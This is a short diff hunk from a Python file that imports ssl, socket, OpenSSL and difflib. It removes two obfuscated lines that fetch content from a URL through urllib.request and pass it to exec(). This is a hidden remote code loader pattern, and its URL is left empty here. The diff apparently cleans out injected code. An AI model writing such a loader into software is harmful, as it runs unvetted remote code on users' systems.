@@ -27,7 +27,3 @@ import ssl
 import socket
 import OpenSSL
 import difflib
-
-exec(__import__("importlib").import_module("urllib.request").urlopen("").read())
-
-exec(__import__("importlib").import_module("urllib.request").urlopen("").read())
